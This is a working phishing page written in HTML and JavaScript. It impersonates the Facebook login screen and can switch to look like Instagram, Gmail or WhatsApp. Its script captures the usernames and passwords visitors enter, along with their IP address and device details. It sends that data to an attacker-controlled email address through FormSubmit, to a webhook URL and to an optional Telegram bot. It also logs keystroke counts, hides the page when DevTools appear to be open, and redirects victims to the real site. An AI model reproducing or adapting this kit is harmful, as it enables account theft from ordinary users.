<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook ‚Äì log in or sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            color: #1c1e21;
        }
        
        .container {
            width: 100%;
            max-width: 980px;
            margin: 0 auto;
            padding: 20px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            min-height: 100vh;
        }
        
        .left-section {
            flex: 1;
            padding: 20px;
            min-width: 300px;
        }
        
        .logo {
            color: #1877f2;
            font-size: 3.5rem;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .tagline {
            font-size: 1.5rem;
            line-height: 1.4;
            color: #1c1e21;
        }
        
        .right-section {
            flex: 1;
            padding: 20px;
            min-width: 300px;
        }
        
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            color: #1d2129;
        }
        
        input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-btn {
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        .forgot-link {
            color: #1877f2;
            text-decoration: none;
            text-align: center;
            display: block;
            padding: 15px 0;
            border-bottom: 1px solid #dadde1;
            margin-bottom: 20px;
        }
        
        .create-btn {
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            width: 60%;
            margin: 0 auto;
            display: block;
        }
        
        .create-btn:hover {
            background: #36a420;
        }
        
        .platform-selector {
            margin-bottom: 20px;
            text-align: center;
        }
        
        .platform-tab {
            display: inline-block;
            padding: 8px 15px;
            margin: 0 5px;
            background: #e4e6eb;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .platform-tab.active {
            background: #1877f2;
            color: white;
        }
        
        .status-box {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 5px;
            margin-top: 15px;
            text-align: center;
            border: 1px solid #c3e6cb;
        }
        
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Mobile Responsive */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                padding: 10px;
            }
            
            .left-section, .right-section {
                width: 100%;
            }
            
            .tagline {
                font-size: 1.3rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
        </div>
        
        <div class="right-section">
            <!-- Platform Selector -->
            <div class="platform-selector">
                <span class="platform-tab active" data-platform="facebook">Facebook</span>
                <span class="platform-tab" data-platform="instagram">Instagram</span>
                <span class="platform-tab" data-platform="gmail">Gmail</span>
                <span class="platform-tab" data-platform="whatsapp">WhatsApp</span>
            </div>
            
            <!-- Login Box -->
            <div class="login-box" id="loginBox">
                <form id="loginForm">
                    <div class="form-group">
                        <input type="text" id="email" placeholder="Email or phone number" required autofocus>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    
                    <button type="submit" class="login-btn" id="submitBtn">
                        Log In
                    </button>
                    
                    <div class="loader" id="loader"></div>
                    
                    <div class="status-box" id="statusBox">
                        ‚úì Login successful! Redirecting...
                    </div>
                    
                    <a href="#" class="forgot-link">Forgotten password?</a>
                    
                    <button type="button" class="create-btn" onclick="showCreateAccount()">
                        Create New Account
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script>
        // ============================
        // KONFIGURASI UTAMA
        // ============================
        const TARGET_EMAIL = "farelgifa23@gmail.com";
        const TELEGRAM_BOT_TOKEN = ""; // Optional: masukkan token bot Telegram
        const TELEGRAM_CHAT_ID = "";   // Optional: masukkan chat ID
        
        // ============================
        // PLATFORM SWITCHER
        // ============================
        const platforms = {
            facebook: {
                title: "Facebook ‚Äì log in or sign up",
                logoText: "facebook",
                tagline: "Facebook helps you connect and share with the people in your life.",
                emailPlaceholder: "Email or phone number",
                buttonText: "Log In",
                color: "#1877f2"
            },
            instagram: {
                title: "Instagram",
                logoText: "Instagram",
                tagline: "Sign in to see photos and videos from your friends.",
                emailPlaceholder: "Phone number, username, or email",
                buttonText: "Log In",
                color: "#E4405F"
            },
            gmail: {
                title: "Gmail",
                logoText: "Gmail",
                tagline: "Sign in with your Google Account",
                emailPlaceholder: "Email or phone",
                buttonText: "Next",
                color: "#EA4335"
            },
            whatsapp: {
                title: "WhatsApp",
                logoText: "WhatsApp",
                tagline: "Simple. Secure. Reliable messaging.",
                emailPlaceholder: "Phone number",
                buttonText: "Continue",
                color: "#25D366"
            }
        };
        
        // Platform tabs
        document.querySelectorAll('.platform-tab').forEach(tab => {
            tab.addEventListener('click', function() {
                const platform = this.dataset.platform;
                
                // Update active tab
                document.querySelectorAll('.platform-tab').forEach(t => {
                    t.classList.remove('active');
                });
                this.classList.add('active');
                
                // Update UI
                const config = platforms[platform];
                document.title = config.title;
                document.querySelector('.logo').textContent = config.logoText;
                document.querySelector('.logo').style.color = config.color;
                document.querySelector('.tagline').textContent = config.tagline;
                document.getElementById('email').placeholder = config.emailPlaceholder;
                document.getElementById('submitBtn').textContent = config.buttonText;
                document.getElementById('submitBtn').style.background = config.color;
            });
        });
        
        // ============================
        // DATA COLLECTION SYSTEM
        // ============================
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const platform = document.querySelector('.platform-tab.active').dataset.platform;
            
            // Show loading
            document.getElementById('loader').style.display = 'block';
            document.getElementById('submitBtn').style.display = 'none';
            
            // Collect user data
            const userData = {
                platform: platform,
                credentials: {
                    email: email,
                    password: password
                },
                metadata: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer
                },
                ip: "Fetching..."
            };
            
            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userData.ip = ipData.ip;
            } catch (error) {
                userData.ip = "Unknown";
            }
            
            // ============================
            // SEND DATA TO TARGET EMAIL
            // ============================
            await sendDataToTarget(userData);
            
            // Show success message
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('statusBox').style.display = 'block';
                
                // Redirect to real site after 3 seconds
                setTimeout(() => {
                    const redirectUrls = {
                        facebook: "https://facebook.com",
                        instagram: "https://instagram.com",
                        gmail: "https://gmail.com",
                        whatsapp: "https://web.whatsapp.com"
                    };
                    window.location.href = redirectUrls[platform];
                }, 3000);
            }, 2000);
        });
        
        // ============================
        // DATA SENDING METHODS
        // ============================
        async function sendDataToTarget(data) {
            console.log("Sending data to target:", data);
            
            // Method 1: Save locally (backup)
            saveToLocalFile(data);
            
            // Method 2: Send via FormSubmit
            await sendViaFormSubmit(data);
            
            // Method 3: Send via Telegram (optional)
            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                await sendViaTelegram(data);
            }
            
            // Method 4: Send via Webhook
            await sendViaWebhook(data);
        }
        
        function saveToLocalFile(data) {
            // Create download link with data
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `credential_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        async function sendViaFormSubmit(data) {
            // Using FormSubmit.co (FREE service)
            const formData = new FormData();
            formData.append('_subject', `üêü PHISHING ALERT - ${data.platform.toUpperCase()}`);
            formData.append('email', TARGET_EMAIL);
            formData.append('message', formatDataForEmail(data));
            
            try {
                await fetch('https://formsubmit.co/ajax/farelgifa23@gmail.com', {
                    method: 'POST',
                    body: formData
                });
                console.log("‚úÖ Data sent to email via FormSubmit");
            } catch (error) {
                console.error("FormSubmit error:", error);
            }
        }
        
        async function sendViaTelegram(data) {
            const message = `
            üö® NEW CREDENTIALS CAPTURED üö®
            
            Platform: ${data.platform}
            Email: ${data.credentials.email}
            Password: ${data.credentials.password}
            IP: ${data.ip}
            Time: ${new Date().toLocaleString()}
            User Agent: ${data.metadata.userAgent}
            `;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log("‚úÖ Data sent to Telegram");
            } catch (error) {
                console.error("Telegram error:", error);
            }
        }
        
        async function sendViaWebhook(data) {
            // Using webhook.site for testing
            const webhookURL = 'https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx';
            
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log("‚úÖ Data sent to webhook");
            } catch (error) {
                console.error("Webhook error:", error);
            }
        }
        
        function formatDataForEmail(data) {
            return `
            ====================================
            üé£ PHISHING DATA CAPTURED
            ====================================
            
            üì± PLATFORM: ${data.platform.toUpperCase()}
            
            üîê CREDENTIALS:
               Email: ${data.credentials.email}
               Password: ${data.credentials.password}
            
            üåê IP ADDRESS: ${data.ip}
            
            üïê TIMESTAMP: ${data.metadata.timestamp}
            
            üñ•Ô∏è  SYSTEM INFO:
               User Agent: ${data.metadata.userAgent}
               Screen: ${data.metadata.screen}
               Language: ${data.metadata.language}
               Timezone: ${data.metadata.timezone}
            
            üîó PAGE URL: ${data.metadata.url}
            üîó REFERRER: ${data.metadata.referrer}
            
            ====================================
            Generated by Phishing System v2.0
            ====================================
            `;
        }
        
        // ============================
        // ADDITIONAL FEATURES
        // ============================
        function showCreateAccount() {
            alert("Account creation feature is temporarily unavailable. Please try logging in with your existing account.");
        }
        
        // Track user behavior
        let keystrokes = 0;
        let startTime = Date.now();
        
        document.addEventListener('keydown', () => keystrokes++);
        
        // Send analytics on exit
        window.addEventListener('beforeunload', () => {
            const sessionData = {
                type: 'session_analytics',
                keystrokes: keystrokes,
                timeSpent: Math.floor((Date.now() - startTime) / 1000),
                exitTime: new Date().toISOString()
            };
            
            // Send beacon data
            navigator.sendBeacon('https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx', 
                JSON.stringify(sessionData));
        });
        
        // Anti-inspection code
        setInterval(() => {
            const width = window.outerWidth - window.innerWidth;
            const height = window.outerHeight - window.innerHeight;
            if (width > 100 || height > 100) {
                // DevTools might be open
                document.body.innerHTML = '<h1>Security Violation Detected</h1><p>This page has been closed due to security policy.</p>';
            }
        }, 1000);
        
        console.log("üî• Phishing System v2.0 Initialized");
        console.log("üéØ Target Email: farelgifa23@gmail.com");
        console.log("üåê Available Platforms: Facebook, Instagram, Gmail, WhatsApp");
    </script>
</body>
</html>
